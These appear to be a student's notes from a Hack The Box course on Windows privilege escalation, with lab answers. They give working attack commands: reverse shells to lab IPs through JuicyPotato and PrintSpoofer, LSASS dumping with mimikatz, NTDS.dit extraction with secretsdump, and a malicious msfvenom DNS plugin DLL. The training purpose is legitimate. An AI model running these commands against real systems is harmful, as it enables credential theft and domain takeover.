## Getting the Lay of the Land (Enumeration)
#### Situational Awareness
```cmd-session
## Overview
- When placed in any situation, whether in our day-to-day lives or during a project such as a network penetration test, it is always important to orient ourselves in space and time. 

	-> We cannot function and react effectively without an understanding of our current surroundings. 
	
	-> We require this information to make informed decisions about our next steps to operate proactively instead of reactively. 
	
	-> When we land on a Windows or Linux system intending to escalate privileges next, there are several things we should always look for to plan out our next moves. 
	
	-> We may find other hosts that we can access directly, protections in place that will need to be bypassed, or find that certain tools will not work against the system in question.

## Network Information
- Gathering network information is a crucial part of our enumeration. We may find that the host is dual-homed and that compromising the host may allow us to move laterally into another part of the network that we could not access previously. 
 
	-> Dual-homed means that the host or server belongs to two or more different networks and, in most cases, has several virtual or physical network interfaces. 
	
	-> We should always look at [routing tables](https://en.wikipedia.org/wiki/Routing_table) to view information about the local network and networks around it. We can also gather information about the local domain (if the host is part of an Active Directory environment), including the IP addresses of domain controllers. It is also important to use the [arp](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/arp) command to view the ARP cache for each interface and view other hosts the host has recently communicated with.
	
	 -> This could help us with lateral movement after obtaining credentials. 
	 
	 -> It could be a good indication of which hosts administrators are connecting to via RDP or WinRM from this host.

- Interface(s), IP Address(es), DNS Information

C:\htb> ipconfig /all

C:\htb> arp -a

C:\htb> route print


## Enumerating Protections
- Most modern environments have some sort of anti-virus or Endpoint Detection and Response (EDR) service running to monitor, alert on, and block threats proactively. 
 
	-> These tools may interfere with the enumeration process. They will very likely present some sort of challenge during the privilege escalation process, especially if we are using some kind of public PoC exploit or tool. 
	
	-> Enumerating protections in place will help us ensure that we are using methods that are not being blocked or detected and will help us if we have to craft custom payloads or modify tools before compiling them.
	
PS C:\htb> Get-MpComputerStatus

PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PS C:\htb> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

// Questions
Q1:What is the IP address of the other NIC attached to the target host?
ipconfig /all

Q2:What executable other than cmd.exe is blocked by AppLocker?
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

#### Initial Enumeration
```cmd-session
## overview
- During an assessment, we may gain a low-privileged shell on a Windows host (domain-joined or not) and need to perform privilege escalation to further our access. 

	-> Fully compromising the host may gain us access to sensitive files/file shares, grant us the ability to capture traffic to obtain more credentials, or obtain credentials that can help further our access or even escalate directly to Domain Admin in an Active Directory environment. 
	
	-> We can escalate privileges to one of the following depending on the system configuration and what type of data we encounter

## Key Data Points

- `OS name`: Knowing the type of Windows OS (workstation or server) and level (Windows 7 or 10, Server 2008, 2012, 2016, 2019, etc.) will give us an idea of the types of tools that may be available (such as the `PowerShell` version, or lack thereof on legacy systems. 
 
	-> This would also identify the operating system version for which there may be public exploits available.

- `Version`: As with the OS [version](https://en.wikipedia.org/wiki/Comparison_of_Microsoft_Windows_versions), there may be public exploits that target a vulnerability in a specific version of Windows. 
 
	-> Windows system exploits can cause system instability or even a complete crash.
	
	 -> Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.

- `Running Services`: Knowing what services are running on the host is important, especially those running as `NT AUTHORITY\SYSTEM` or an administrator-level account. 
 
	-> A misconfigured or vulnerable service running in the context of a privileged account can be an easy win for privilege escalation.

## System Information
- Looking at the system itself will give us a better idea of the exact operating system version, hardware in use, installed programs, and security updates. 
 
	-> This will help us narrow down our hunt for any missing patches and associated CVEs that we may be able to leverage to escalate privileges. Using the [tasklist](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist) command to look at running processes will give us a better idea of what applications are currently running on the system.

- Tasklist
C:\htb> tasklist /svc

- Display All Environment Variables
C:\htb> set

- View Detailed Configuration Information
C:\htb> systeminfo

- Patches and Updates
C:\htb> wmic qfe

PS C:\htb> Get-HotFix | ft -AutoSize

- Installed Programs
C:\htb> wmic product get name

PS C:\htb> Get-WmiObject -Class Win32_Product |  select Name, Version

-  Display Running Processes
PS C:\htb> netstat -ano

## User & Group Information

- Users are often the weakest link in an organization, especially when systems are configured and patched well.
 
	-> It is essential to gain an understanding of the users and groups on the system, members of specific groups that can provide us with admin level access, the privileges our current user has, password policy information, and any logged on users that we may be able to target. 
	
	-> We may find the system to be well patched, but a member of the local administrators group's user directory is browsable and contains a password file such as `logins.xlsx`, resulting in a very easy win.

- Logged-In Users
C:\htb> query user

- Current User
C:\htb> echo %USERNAME%

- Current User Privileges
C:\htb> whoami /priv

- Current User Group Information
C:\htb> whoami /groups

- Get All Users
C:\htb> net user

- Get All Groups
C:\htb> net localgroup

- Details About a Group
C:\htb> net localgroup administrators

- Get Password Policy & Other Account Information
C:\htb> net accounts

Note: Combine with tools such as winpeas will make the enumeration faster

// Questions
whoami /priv

net localgroup
net localgroup "Backup Operators"

netstat -ano
tasklist /FI "pid eq 2388"

query user

## Questions
Q1: What non-default privilege does the htb-student user have?
- Follow the sections on related parts:
whoami /priv
-> SeTakeOwnershipPrivilege
Q2: Who is a member of the Backup Operators group?
net localgroup
net localgroup "Backup Operators"
-> sarah
Q3: What service is listening on port 8080 (service name not the executable)?
netstat -ano
-> PID = 2388
Through PID we can get task
tasklist /FI "pid eq 2388"
-> Tomcat8.exe
Q4: What user is logged in to the target host?
query user
-> sccm_svc
Q5: What type of session does this user have?
From prev questions
-> console
```

#### Communication with Processes
```cmd-session
## Overview
- One of the best places to look for privilege escalation is the processes that are running on the system. 
	
	-> Even if a process is not running as an administrator, it may lead to additional privileges. 
	
	-> The most common example is discovering a web server like IIS or XAMPP running on the box, placing an `aspx/php` shell on the box, and gaining a shell as the user running the web server. 
	
	-> Generally, this is not an administrator but will often have the `SeImpersonate` token, allowing for `Rogue/Juicy/Lonely Potato` to provide SYSTEM permissions.

## Access Tokens
- In Windows, [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens) are used to describe the security context (security attributes or rules) of a process or thread. 
 
	-> The token includes information about the user account's identity and privileges related to a specific process or thread.
	
	-> When a user authenticates to a system, their password is verified against a security database, and if properly authenticated, they will be assigned an access token. 
	
	-> Every time a user interacts with a process, a copy of this token will be presented to determine their privilege level.

## Enumerating Network Services
- The most common way people interact with processes is through a network socket (DNS, HTTP, SMB, etc.). 
 
	-> The [netstat](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat) command will display active TCP and UDP connections which will give us a better idea of what services are listening on which port(s) both locally and accessible to the outside. 
	
	-> We may find a vulnerable service only accessible to the localhost (when logged on to the host) that we can exploit to escalate privileges.

- Display Active Network Connections
C:\htb> netstat -ano

- More examples
	-> Splunk Universal Forwarder
	-> Erlang Port (25672)


## Named Pipes
- The other way processes communicate with each other is through Named Pipes. Pipes are essentially files stored in memory that get cleared out after being read. 
 
	-> Cobalt Strike uses Named Pipes for every command (excluding [BOF](https://www.cobaltstrike.com/help-beacon-object-files)).
	
	-> Essentially the workflow looks like this:

	1. Beacon starts a named pipe of \.\pipe\msagent_12
	2. Beacon starts a new process and injects command into that process directing output to \.\pipe\msagent_12
	3. Server displays what was written into \.\pipe\msagent_12

- Listing Named Pipes with Pipelist
C:\htb> pipelist.exe /accepteula

- Listing Named Pipes with PowerShell
PS C:\htb>  gci \\.\pipe\

- Reviewing LSASS Named Pipe Permissions
C:\htb> accesschk.exe /accepteula \\.\Pipe\lsass -v

## Named Pipes Attack Example
- Let's walk through an example of taking advantage of an exposed named pipe to escalate privileges. 
 
	-> This [WindscribeService Named Pipe Privilege Escalation](https://www.exploit-db.com/exploits/48021) is a great example.
	
	 -> Using `accesschk` we can search for all named pipes that allow write access with a command such as `accesschk.exe -w \pipe\* -v` and notice that the `WindscribeService` named pipe allows `READ` and `WRITE` access to the `Everyone` group, meaning all authenticated users.

- Checking WindscribeService Named Pipe Permissions
C:\htb> accesschk.exe -accepteula -w \pipe\WindscribeService -v

## Questions
netstat -ano
tasklist /FI "pid eq 1812"

accesschk.exe -accepteula -w \pipe\SQLLocal\SQLEXPRESS01 -v
```

## Windows User Privileges

#### Windows Privileges Overview
```powershell-session
## Overview
- [Privileges](https://docs.microsoft.com/en-us/windows/win32/secauthz/privileges) in Windows are rights that an account can be granted to perform a variety of operations on the local system such as managing services, loading drivers, shutting down the system, debugging an application, and more. 
 
	-> Privileges are different from access rights, which a system uses to grant or deny access to securable objects. 
	
	-> User and group privileges are stored in a database and granted via an access token when a user logs on to a system. 
	
	-> An account can have local privileges on a specific computer and different privileges on different systems if the account belongs to an Active Directory domain. 
	
	-> Each time a user attempts to perform a privileged action, the system reviews the user's access token to see if the account has the required privileges, and if so, checks to see if they are enabled. Most privileges are disabled by default.
	
	 > Some can be enabled by opening an administrative cmd.exe or PowerShell console, while others can be enabled manually.

## Windows Authorization Process
- Security principals are anything that can be authenticated by the Windows operating system, including user and computer accounts, processes that run in the security context or another user/computer account, or the security groups that these accounts belong to. 
 
	-> Security principals are the primary way of controlling access to resources on Windows hosts. 
	
	-> Every single security principal is identified by a unique [Security Identifier (SID)](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows). 
	
	-> When a security principal is created, it is assigned a SID which remains assigned to that principal for its lifetime.

## Rights and Privileges in Windows
- Windows contains many groups that grant their members powerful rights and privileges. 

	-> Many of these can be abused to escalate privileges on both a standalone Windows host and within an Active Directory domain environment. 
	
	-> Ultimately, these may be used to gain Domain Admin, local administrator, or SYSTEM privileges on a Windows workstation, server, or Domain Controller (DC). Some of these groups are listed below.

## User Rights Assignment

- Depending on group membership, and other factors such as privileges assigned via domain and local Group Policy, users can have various rights assigned to their account. 
 
	-> This Microsoft article on [User Rights Assignment](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment) provides a detailed explanation of each of the user rights that can be set in Windows as well as security considerations applicable to each right. 
	
	-> Below are some of the key user rights assignments, which are settings applied to the localhost. 
	
	-> These rights allow users to perform tasks on the system such as logon locally or remotely, access the host from the network, shut down the server, etc.

- Local Admin User Rights - Elevated
PS C:\htb> whoami 

- Standard User Rights
PS C:\htb> whoami /priv
-> Different privileges on different user.

## Detection
- This [post](https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e) is worth a read for more information on Windows privileges as well as detecting and preventing abuse, specifically by logging event [4672: Special privileges assigned to new logon](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672) which will generate an event if certain sensitive privileges are assigned to a new logon session. 
 
	-> This can be fine-tuned in many ways, such as by monitoring privileges that should _never_ be assigned or those that should only ever be assigned to specific accounts.
```

SeImpersonate and SeAssignPrimaryToken
```shell-session
## Overview
- In Windows, every process has a token that has information about the account that is running it. 
 
	-> These tokens are not considered secure resources, as they are just locations within memory that could be brute-forced by users that cannot read memory. 
	
	-> To utilize the token, the `SeImpersonate` privilege is needed. It is only given to administrative accounts, and in most cases, can be removed during system hardening.
	
	-> An example of using this token would be [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw).

## SeImpersonate Example - JuicyPotato

- Let's take the example below, where we have gained a foothold on a SQL server using a privileged SQL user. 
 
	-> Client connections to IIS and SQL Server may be configured to use Windows Authentication. 
	
	-> The server may then need to access other resources such as file shares as the connecting client.
	
	-> It can be done by impersonating the user whose context the client connection is established. 
	
	-> To do so, the service account will be granted the [Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication) privilege.

- Connecting with MSSQLClient.py
mssqlclient.py sql_dev@10.129.43.30 -windows-auth

- Enabling xp_cmdshell 
SQL> enable_xp_cmdshell

enable_xp_cmdshell
Note: We don't actually have to type `RECONFIGURE` as Impacket does this for us.

- Confirming access
SQL> xp_cmdshell whoami

- Checking Account Privileges
SQL> xp_cmdshell whoami /priv

- Escalating Privileges Using JuicyPotato
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

sudo nc -lnvp 8443

## PrintSpoofer and RoguePotato

- JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access.
 
	-> This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

- Escalating Privileges using PrintSpoofer
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

## Questions
- Follow the sections on JuicPotato
mssqlclient.py sql_dev@10.129.182.42 -windows-auth
SQL> enable_xp_cmdshell

SQL> xp_cmdshell whoami
SQL> xp_cmdshell whoami /priv

JuicyPotato
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.16.13 8443 -e cmd.exe" -t *

sudo nc -lnvp 8443

more c:\Users\Administrator\Desktop\SeImpersonate\flag.txt
```

SeDebugPrivilege
```
## Overview
- To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. 
 
	-> This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. 
	
	-> This right may be assigned to developers who need to debug new system components as part of their day-to-day job. This user right should be given out sparingly because any account that is assigned it will have access to critical operating system components.

- Open cmd in local admin mode. 

C:\htb> whoami /priv

C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

- copy lsass.dmp into the mimkatz folder

Note: It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file. This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.

C:\htb> mimikatz.exe 

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log 
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp 
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords 

- Task manager -> Details tab -> select LSASS proess -> Create dump file

## Remote Code Execution as SYSTEM
- We can also leverage `SeDebugPrivilege` for [RCE](https://decoder.cloud/2018/02/02/getting-system/). 
 
	-> Using this technique, we can elevate our privileges to SYSTEM by launching a [child process](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) and using the elevated rights granted to our account via `SeDebugPrivilege` to alter normal system behavior to inherit the token of a [parent process](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads) and impersonate it.
	
	 -> If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly. Let's see this in action.

- First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) over to the target system. 
 
	-> Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Note that we must add a third blank argument `""` at the end for the PoC to work properly.

- The PoC script has received an update. Please visit its GitHub repository and review its usage. https://github.com/decoder-it/psgetsystem

- Open elevated powershell as admin
PS C:\htb> tasklist 
-> WinLogins.exe PID=600\
or

Get-Process lsass
-> PID 688

python -m http.server

certutil -urlcache -split -f "http://10.10.16.13:8000/psgetsys.ps1" 

PS> . .\psgetsys.ps1 

PS> ImpersonateFromParentPid -ppid 600 -command "c:\Windows\System32\cmd.exe" -cmdargs ""

ImpersonateFromParentPid -ppid 688 -command "c:\Windows\System32\cmd.exe" -cmdargs ""

## Questions
Leverage SeDebugPrivilege rights and obtain the NTLM password hash for the sccm_svc account.
- Follow the sections on ## Overview
	-> Open cmd in local admin mode. 

C:\htb> whoami /priv
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

- copy lsass.dmp into the mimkatz folde

.\mimikatz.exe "log" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
or equivalent command in interactive mode.
```

#### SeTakeOwnershipPrivilege 
```powershell-session
## Overview
- [SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor.
 
	-> Administrators are assigned this privilege by default. While it is rare to encounter a standard user account with this privilege, we may encounter a service account that, for example, is tasked with running backup jobs and VSS snapshots assigned this privilege. 
	
	-> It may also be assigned a few others such as `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeSecurityPrivilege` to control this account's privileges at a more granular level and not granting the account full local admin rights.
	
	-> These privileges on their own could likely be used to escalate privileges.
	
	-> Still, there may be times when we need to take ownership of specific files because other methods are blocked, or otherwise, do not work as expected. 
	
	-> Abusing this privilege is a bit of an edge case. Still, it is worth understanding in-depth, especially since we may also find ourselves in a scenario in an Active Directory environment where we can assign this right to a specific user that we can control and leverage it to read a sensitive file on a file share.

## Leveraging the Privilege
-  Reviewing Current User Privileges
PS C:\htb> whoami /priv

- Enabling SeTakeOwnershipPrivilege
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

Note: Take great care when performing a potentially destructive action like changing file ownership, as it could cause an application to stop working or disrupt user(s) of the target object. Changing the ownership of an important file, such as a live web.config file, is not something we would do without consent from our client first. Furthermore, changing ownership of a file buried down several subdirectories (while changing each subdirectory permission on the way down) may be difficult to revert and should be avoided.

- Checking File Ownership
PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'

PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'

- Confirming Ownership Changed
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

- Modifying the File ACL
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

- Reading the File
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

## When to Use?
- Files of Interest to use:
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav

- Other file of interests:
`.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.

## Questions
Q:Leverage SeTakeOwnershipPrivilege rights over the file located at "C:\TakeOwn\flag.txt" and submit the contents.
- Run powershell as admin. 

PS C:\htb> whoami /priv

takeown /f 'C:\TakeOwn\flag.txt'

icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F

cat 'C:\TakeOwn\flag.txt'
```

## Windows Group Privileges

#### Windows Built-in Groups
```
## Overview
- As mentioned in the `Windows Privileges Overview` section, Windows servers, and especially Domain Controllers, have a variety of built-in groups that either ship with the operating system or get added when the Active Directory Domain Services role is installed on a system to promote a server to a Domain Controller. 
 
	-> Many of these groups confer special privileges on their members, and some can be leveraged to escalate privileges on a server or a Domain Controller. [Here](https://ss64.com/nt/syntax-security_groups.html) is a listing of all built-in Windows groups along with a detailed description of each. 
	
	-> This [page](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory) has a detailed listing of privileged accounts and groups in Active Directory. 
	
	-> It is essential to understand the implications of membership in each of these groups whether we gain access to an account that is a member of one of them or notice excessive/unnecessary membership in one or more of these groups during an assessment.
	
	 -> For our purposes, we will focus on the following built-in groups. Each of these groups exists on systems from Server 2008 R2 to the present, except for Hyper-V Administrators (introduced with Server 2012).

## Backup Operators

- After landing on a machine, we can use the command `whoami /groups` to show our current group memberships. 
 
	-> Let's examine the case where we are a member of the `Backup Operators` group. Membership of this group grants its members the `SeBackup` and `SeRestore` privileges. 
	
	-> The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents. 
	
	-> This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). 
	
	-> However, we can't do this using the standard copy command. 
	
	-> Instead, we need to programmatically copy the data, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag.

- We can use this [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the `SeBackupPrivilege`, and copy this file.
 
	-> First, let's import the libraries in a PowerShell session.

- Verifying SeBackupPrivilege is Enabled
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll

PS C:\htb> whoami /priv

Note: Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.

PS C:\htb> Get-SeBackupPrivilege

- Enabling SeBackupPrivilege
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

PS C:\htb> whoami /priv

- Copying a Protected File
PS C:\htb> dir C:\Confidential\

PS C:\htb> cat 'C:\Confidential\2021 Contract.txt'

PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

PS C:\htb>  cat .\Contract.txt

- Attacking a Domain Controller - Copying NTDS.dit
PS C:\htb> diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\htb> dir E:

- Copying NTDS.dit Locally
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

- Backing up SAM and SYSTEM Registry Hives
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV

C:\htb> reg save HKLM\SAM SAM.SAV

- Extracting Credentials from NTDS.dit
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

- Extracting Hashes Using SecretsDump
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

## Robocopy

- Copying Files with Robocopy

- The built-in utility [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) can be used to copy files in backup mode as well.
 
	-> Robocopy is a command-line directory replication tool. It can be used to create backup jobs and includes features such as multi-threaded copying, automatic retry, the ability to resume copying, and more. 
	
	-> Robocopy differs from the `copy` command in that instead of just copying all files, it can check the destination directory and remove files no longer in the source directory.
	
	-> It can also compare files before copying to save time by not copying files that have not been changed since the last copy/backup job ran.
	
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit

## Questions
- Follow the sections on ## Backup Operators
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll

PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

PS C:\htb> dir c:\Users\Administrator\Desktop\SeBackupPrivilege

PS C:\htb> Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt

PS C:\htb> cat flag.txt
```

#### Event Log Readers
```
## Overview
- Suppose [auditing of process creation](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation) events and corresponding command line values is enabled. 
 
	-> In that case, this information is saved to the Windows security event log as event ID [4688: A new process has been created](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688). 
	
	-> Organizations may enable logging of process command lines to help defenders monitor and identify possibly malicious behavior and identify binaries that should not be present on a system. 
	
	-> This data can be shipped to a SIEM tool or ingested into a search tool, such as ElasticSearch, to give defenders visibility into what binaries are being run on systems in the network. 
	
	-> The tools would then flag any potentially malicious activity, such as the `whoami`, `netstat`, and `tasklist` commands being run from a marketing executive's workstation.

- Confirming Group Membership
C:\htb> net localgroup "Event Log Readers"

- Searching Security Logs Using wevtutil
PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"

- Passing Credentials to wevtutil
C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"

- Searching Security Logs Using Get-WinEvent
PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

Note: Searching the `Security` event log with `Get-WInEvent` requires administrator access or permissions adjusted on the registry key `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. Membership in just the `Event Log Readers` group is not sufficient.

## Questions
net localgroup "Event Log Readers"

PS C:\Users\logger> wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

#### DnsAdmins
```
## Overview
- Members of the [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) group have access to DNS information on the network. 
 
	-> The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. 
	
	-> The DNS service runs as `NT AUTHORITY\SYSTEM`, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. 
	
	-> It is possible to use the built-in [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility to specify the path of the plugin DLL. As detailed in this excellent [post](https://adsecurity.org/?p=4064), the following attack can be performed when DNS is run on a Domain Controller (which is very common):

	- DNS management is performed over RPC
	- [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the `dnscmd` tool from the command line
	- When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
	- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
	- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

	->Let's step through the attack.
	
## Leveraging DnsAdmins Access

- Generating Malicious DLL
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

- Starting Local HTTP Server
python3 -m http.server 7777

- Downloading File to Target
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"

- Loading DLL as Non-Privileged User
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

- Loading DLL as Member of DnsAdmins
C:\htb> Get-ADGroupMember -Identity DnsAdmins

- Loading Custom DLL
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Note: We must specify the full path to our custom DLL or the attack will not work properly.

- Finding User's SID
C:\htb> wmic useraccount where name="netadm" get sid

- Checking Permissions on DNS Service
C:\htb> sc.exe sdshow DNS

- Stopping the DNS Service
C:\htb> sc stop dns

- Starting the DNS Service
C:\htb> sc start dns

- Confirming Group Membership
C:\htb> net group "Domain Admins" /dom

## Cleaning Up
- Making configuration changes and stopping/restarting the DNS service on a Domain Controller are very destructive actions and must be exercised with great care. 
 
	-> As a penetration tester, we need to run this type of action by our client before proceeding with it since it could potentially take down DNS for an entire Active Directory environment and cause many issues. 
	
	-> If our client gives their permission to go ahead with this attack, we need to be able to either cover our tracks and clean up after ourselves or offer our client steps on how to revert the changes.

- Confirming Registry Key Added
C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

- Deleting Registry Key
C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

- Starting the DNS Service Again
C:\htb> sc.exe start dns

- Checking DNS Service Status
C:\htb> sc query dns

## Using Mimilib.dll

